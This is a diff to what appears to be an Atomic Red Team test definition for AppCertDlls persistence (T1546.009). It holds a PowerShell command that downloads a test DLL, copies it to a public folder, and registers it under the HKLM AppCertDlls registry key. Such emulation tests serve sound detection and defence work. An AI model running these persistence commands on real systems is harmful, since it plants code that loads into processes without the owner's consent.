@@ -15,8 +15,8 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll"
-          -OutFile "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll"; fi; Copy-Item
-          "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
+          -OutFile "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll" -UseBasicParsing;
+          fi; Copy-Item "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
           -Force; reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
           Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll"
           /f; if($false){Restart-Computer}'
@@ -30,9 +30,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - t1546.009
   - persistence
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -55,9 +55,9 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll"
-        -OutFile "#{dll_path}"
+        -OutFile "#{dll_path}" -UseBasicParsing
 
         '
     technique_created: '2020-01-24T14:47:41.795Z'
     atomic_guid: a5ad6104-5bab-4c43-b295-b4c44c7c6b05
-    import_timestamp: '2026-10-20T07:08:28.835807Z'
+    import_timestamp: '2026-10-21T07:01:50.940205Z'
